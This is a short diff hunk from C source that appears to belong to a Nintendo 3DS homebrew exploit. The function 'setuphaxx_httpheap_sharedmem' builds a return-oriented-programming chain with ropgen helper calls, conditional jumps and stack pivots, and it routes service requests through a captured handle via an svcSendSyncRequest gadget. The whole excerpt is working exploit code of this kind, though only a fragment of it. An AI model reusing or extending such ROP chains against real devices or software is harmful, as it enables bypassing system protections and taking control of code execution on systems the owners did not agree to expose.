@@ -1294,9 +1294,44 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_movr1r0(&ropchain, &ropvaddr);
 	ropgen_writeu32(&ropchain, &ropvaddr, 0xd900182f, 0, 0);
 
+	/*
+	if(cmdhdr==0x00000002)
+	{
+		customcmdhandler_handlestorage = cmdreq[2];
+		retval = 0;
+	}
+	else
+	{
+		retval = <svcSendSyncRequest gadget>(customcmdhandler_handlestorage ptr);
+	}
+	cmdreply[1] = retval;
+	*/
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
+	ropgen_popr1(&ropchain, &ropvaddr, 0x00000002);
+	ropchain3 = ropchain;
+	ropvaddr3 = ropvaddr;
+	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+		//Translate header isn't validated here, but whatever.
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0x8);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+		ropgen_strr0r1(&ropchain, &ropvaddr, customcmdhandler_handlestorage, 1);
+
+		ropgen_setr0(&ropchain, &ropvaddr, 0);
+		ropchain2 = ropchain;
+		ropvaddr2 = ropvaddr;
+		ropgen_stackpivot(&ropchain, &ropvaddr, 0);
+
+	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
+
 	ropgen_svcSendSyncRequest(&ropchain, &ropvaddr, customcmdhandler_handlestorage);
 
-	//Just in case the svc itself fails, write r0 to cmdreply[1].
+	//Write r0 to cmdreply[1].
+	ropgen_stackpivot(&ropchain2, &ropvaddr2, ropvaddr);
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x2c + 0x4, 1);
 
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
